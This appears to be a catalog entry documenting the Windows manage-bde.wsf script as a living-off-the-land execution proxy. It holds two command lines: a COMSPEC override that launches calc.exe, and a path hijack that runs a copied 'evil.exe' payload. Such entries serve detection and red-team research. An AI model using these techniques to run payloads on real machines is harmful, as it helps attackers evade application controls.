---
name: manage-bde.wsf
description: 
functions:
  execute:
    - description: Set the comspec variable to another executable prior to calling manage-bde.wsf for execution.
      code: set comspec=c:\windows\system32\calc.exe & cscript c:\windows\system32\manage-bde.wsf
    - description: Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file.
      code: copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf
resources: 
    - resource: https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712
    - resource: https://twitter.com/bohops/status/980659399495741441
fullpath: 
    - path: C:\Windows\System32\manage-bde.wsf
notes: Thanks to Jimmy - @bophops (Comspec), Daniel Bohannon - @danielhbohannon (Path Hijack)
---